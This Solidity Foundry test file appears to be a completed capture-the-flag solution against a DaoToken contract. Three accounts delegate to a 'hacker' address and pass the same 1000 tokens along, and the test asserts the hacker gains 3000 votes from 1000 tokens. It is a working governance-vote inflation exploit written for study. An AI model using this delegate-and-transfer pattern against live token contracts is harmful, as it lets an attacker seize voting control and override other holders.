// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {DaoToken} from "src/DaoToken.sol";

contract exploitTest is Test {
    DaoToken daoToken;
    address public owner = address(0);
    address public hacker = address(1337);

    address public alice = address(1);
    address public bob = address(2);
    address public carol = address(3);

    function setUp() public {
        vm.startPrank(owner);
        daoToken = new DaoToken();
        daoToken.mint(alice, 1000);
        vm.stopPrank();
    }

    function testExploit() public {
        vm.startPrank(alice);
        daoToken.delegate(hacker);
        // write your solution here
        daoToken.transfer(bob,1000);
        vm.stopPrank();
        
        vm.startPrank(bob);
        daoToken.delegate(hacker);
        // write your solution here
        daoToken.transfer(carol,1000);
        vm.stopPrank();

        vm.startPrank(carol);
        daoToken.delegate(hacker);
        // write your solution here
        daoToken.transfer(hacker,1000);
        vm.stopPrank();

        uint256 hacker_vote = daoToken.getVotes(hacker);
        console.log("Vote Count of Hacker before attack: %s ", hacker_vote);

        uint256 hacker_balance = daoToken.balanceOf(hacker);
        console.log("Hacker's daoToken after the attack: %s: ", hacker_balance);

        assertEq(hacker_vote, 3000);
        assertEq(hacker_balance, 1000);
    }
}
